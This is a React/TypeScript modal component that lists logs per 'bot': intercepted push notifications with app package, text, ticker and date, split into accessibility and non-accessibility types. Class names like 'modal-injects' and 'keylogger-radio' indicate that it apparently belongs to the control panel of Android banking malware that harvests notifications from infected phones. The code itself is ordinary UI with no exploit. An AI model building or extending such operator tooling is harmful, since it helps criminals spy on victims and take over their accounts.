import React, {useEffect, useRef, useState} from "react";
import {ModalsProps} from "../../../Model/Modal";
import {Button, Modal, Pagination, Radio, RadioChangeEvent, Space, Table} from "antd";
import {RedoOutlined} from "@ant-design/icons";
import {AppState} from "../../../Store/RootReducer";
import {getLogsList, setLogsPage} from "../../../Store/Logs/Actions";
import {Bot} from "../../../Model/Bot";
import {useTranslation} from "react-i18next";
import {useAppDispatch} from "../../../Hook/useAppDispatch";
import {useAppSelector} from "../../../Hook/useAppSelector";
import {BotLog} from "../../../Model/BotLog";

interface PushListProps extends ModalsProps {
    bot: Bot,
}

const PushList: React.FC<PushListProps> = (props: PushListProps) => {
    const dispatch = useAppDispatch();
    const logsReducer = useAppSelector((state: AppState) => state.logs);
    const {t} = useTranslation();
    const [pushType, setPushType] = useState("pushlist");

    useEffect(() => {
        if (props.visible) {
            dispatch(getLogsList(pushType, props.bot.id, null, logsReducer.filters, logsReducer.sort, logsReducer.page, logsReducer.per_page));
        }
    }, [dispatch, props.bot.id, props.visible, logsReducer.page, logsReducer.per_page, pushType]);

    const closeModal = () => {
        props.setVisible(false);
    };

    const refreshPushList = () => {
        dispatch(getLogsList(pushType, props.bot.id, null, logsReducer.filters, logsReducer.sort, logsReducer.page, logsReducer.per_page));
    };

    console.log(logsReducer.logs.map((log) => {
        console.log(log.log);
    }));

    const tableRef = useRef<HTMLDivElement>(null);

    const columns = [
        {
            title: t("APPLICATION"),
            dataIndex: "package",
            key: "package",
            render: (_package: string, log: BotLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("APPLICATION")}</b>
                    </div>
                    <div className="table-col-item">
                        {(log.log["package"] as string)}
                    </div>
                </div>
            ),
        },
        {
            title: t("TEXT"),
            dataIndex: "text",
            key: "text",
            render: (text: string, log: BotLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("TEXT")}</b>
                    </div>
                    <div className="table-col-item">
                        {(log.log["text"] as string)}
                    </div>
                </div>
            ),
        },
        {
            title: t("NOTIFICATION"),
            dataIndex: "notification",
            key: "notification",
            render: (notification: string, log: BotLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("NOTIFICATION")}</b>
                    </div>
                    <div className="table-col-item">
                        {(log.log["notification"] as string)}
                    </div>
                </div>
            ),
        },
        {
            title: t("TICKER"),
            dataIndex: "ticker",
            key: "ticker",
            render: (ticker: string, log: BotLog) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("TICKER")}</b>
                    </div>
                    <div className="table-col-item">
                        {(log.log["ticker"] as string)}
                    </div>
                </div>
            ),
        },
        {
            title: t("DATE"),
            dataIndex: "created_at",
            key: "created_at",
            render: (created_at: string) => (
                <div className="table-col">
                    <div className="table-col-item">
                        <b>{t("DATE")}</b>
                    </div>
                    <div className="table-col-item">
                        {created_at}
                    </div>
                </div>
            ),
        },
    ];

    const isLoaded = logsReducer.isLoaded && logsReducer.type === pushType && logsReducer.botId === props.bot.id;

    const onChangeAction = (e: RadioChangeEvent) => {
        setPushType(e.target.value);
    };

    const pushListTypes = [
        {label: t("ACCESSIBILITY_PUSH"), value: "pushlist"},
        {label: t("NON_ACCESSIBILITY_PUSH"), value: "pushlist2"},
    ];

    const logsPaginationHandler = (pageNumber: number, size: number) => {
        if (logsReducer.isLoaded &&
            logsReducer.page === logsReducer.loaded_page &&
            logsReducer.page === logsReducer.loaded_page &&
            logsReducer.loaded_per_page === logsReducer.per_page) {
            if (tableRef.current) {
                tableRef.current.scrollTo(0, 0);
            }

            dispatch(setLogsPage(pageNumber, size));
        }
    };

    return (
        <Modal
            title={t("pushlist")}
            open={props.visible}
            onCancel={closeModal}
            width={900}
            className="modal-injects"
            destroyOnClose
            footer={[
                <>
                    <Pagination
                        total={logsReducer.total}
                        defaultPageSize={logsReducer.per_page}
                        onChange={logsPaginationHandler}
                        current={logsReducer.page}
                        showSizeChanger={true}
                        disabled={logsReducer.loaded_page !== logsReducer.page || logsReducer.loaded_per_page !== logsReducer.per_page}
                        style={{marginBottom: 15}}
                        locale={{
                            items_per_page: "",
                        }}
                    />

                    <Button
                        type="primary"
                        onClick={refreshPushList}
                        icon={<RedoOutlined />}
                    >
                        Refresh
                    </Button>
                    <Button
                        type="primary"
                        onClick={closeModal}
                        danger
                    >
                        Close
                    </Button>
                </>,
            ]}
        >
            <div className="table-scroll" style={{maxHeight: 600, overflowY: "auto"}} ref={tableRef}>
                <div style={{
                    padding: "15px 0",
                }}>
                    <h4 style={{textAlign: "center"}}>{t("LOGS_TYPE")}:</h4>
                    <div style={{
                        display: "flex",
                        justifyContent: "center",
                    }}>
                        <Radio.Group
                            options={pushListTypes}
                            optionType="button"
                            value={pushType}
                            onChange={onChangeAction}
                            buttonStyle="solid"
                            className="keylogger-radio"
                        />
                    </div>
                </div>

                <Table
                    columns={columns}
                    dataSource={isLoaded ? logsReducer.logs : []}
                    size="small"
                    pagination={false}
                    sticky={true}
                    loading={!isLoaded}
                    locale={{
                        emptyText: (
                            <Space>
                                <i className="fa-solid fa-robot" /> {t("TABLE_EMPTY")}
                            </Space>
                        ),
                    }}
                    rowKey={"id"}
                />
            </div>
        </Modal>
    );
};

export default PushList;
